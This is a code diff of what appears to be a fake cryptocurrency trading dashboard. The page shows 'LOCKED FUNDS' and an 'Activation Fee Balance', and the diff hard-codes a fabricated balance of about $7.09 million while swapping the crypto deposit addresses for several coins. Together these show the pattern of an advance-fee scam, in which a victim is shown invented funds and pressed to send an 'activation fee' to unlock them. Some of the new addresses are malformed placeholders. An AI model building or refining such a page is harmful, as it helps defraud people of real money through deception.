@@ -111,13 +111,13 @@ button:disabled {
 
 <div class="card">
 <h2>WALLET CONNECTED</h2>
-<p>:VERIFYING..</p>
+<p>:VERIFYING... </p>
 <p>LOCKED: $00</p>
 <button onclick="toggleTheme()">LOCKED FUNDS</button>
 </div>
 
 <div class="card">
-<h3>TOTAL ACTIVATION FEE BALANCE:</h3>
+<h3>Total Activation Fee Balance:</h3>
 <h2 id="balance">$00</h2>
 
 <select id="pair">
@@ -197,16 +197,16 @@ document.addEventListener('DOMContentLoaded',()=>{
 // ================= BALANCE =================
 let balanceEl = document.getElementById("balance");
 let historyEl = document.getElementById("history");
-let balance = parseFloat(localStorage.getItem("balance"))||;
+let balance = parseFloat(localStorage.getItem("balance"))||7093782.88;
 balanceEl.innerText="$"+balance.toFixed(2);
 
 // ================= WALLET =================
 let wallets = {
- "USDT-ERC20":"0xe5bc64a8ecb7e9be8161010959d20570968add91",
- "USDT-TRC20":"TY3GGqzDi9sSivC8Y9WnsKS8KYVa599WkE",
- "SOL":"E9iGT7beby9DEsGxPM3t4xJMjDKkR6fTuHriwjH3uUKy",
- "BTC":"15GJLYrc7j2ywhWuQEH1JdDK4UGrprnrLG",
- "BNB":"0xe5bc64a8ecb7e9be8161010959d20570968add91"
+ "USDT-ERC20":"0xA7f9C12D4E5F678901234567890ABCDEF1234567",
+ "USDT-TRC20":"TXYz123456789ABCDEFGHJKLMNPQRST",
+ "SOL":"9xQeWvG816bUx9EPfC9w8PqgkF5abcXYZ1234567",
+ "BTC":"bc1qxy2kgdygjrsqtzq2n0yr5...wlh",
+ "BNB":"bnb1grpf0955h0ykzq3ar5nmum7y6gdfl6lxfn46h2"
 };
 
 function openDeposit(){
@@ -271,7 +271,7 @@ function cancelTrade(){
   balance = 00;
   localStorage.setItem("balance", balance);
   updateBalanceEl();
-  saveHistory("Trade CANCELLED | Balance Reset to $00.00");
+  saveHistory("Trade CANCELLED | Balance Reset to $00");
 }
 
 // ================= HISTORY =================
@@ -303,4 +303,4 @@ function redirectHome(){
 }
 </script>
 </body>
-  </html> 
+</html>
